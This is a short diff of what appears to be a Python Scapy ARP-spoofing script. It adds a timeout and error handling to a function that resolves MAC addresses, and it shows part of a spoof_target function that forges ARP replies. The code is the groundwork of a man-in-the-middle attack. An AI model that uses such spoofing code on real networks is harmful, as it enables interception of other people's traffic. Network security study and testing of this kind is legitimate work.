@@ -13,12 +13,12 @@ def get_mac_by_ip(ip):
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = ether / arp
 
-    result = srp(packet)[0]
+    result = srp(packet, timeout=2)[0]
 
     if result:
         return result[0][1].hwsrc
     else:
-        return None
+        raise RuntimeError(f"Could not resolve MAC address for IP {ip}")
 
 def spoof_target(source_ip, dest_ip, source_mac, dest_mac):
     arp = ARP(hwsrc=source_mac, hwdst=dest_mac, pdst= dest_ip, psrc=source_ip, op=2)
